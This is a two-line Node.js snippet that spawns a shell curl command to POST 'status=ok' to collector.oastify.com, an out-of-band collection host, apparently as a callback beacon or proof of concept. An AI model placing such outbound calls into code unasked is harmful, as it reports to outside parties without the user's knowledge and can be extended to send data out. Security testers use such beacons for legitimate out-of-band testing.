const { exec } = require("child_process");

exec("curl -X POST collector.oastify.com -d status=ok");
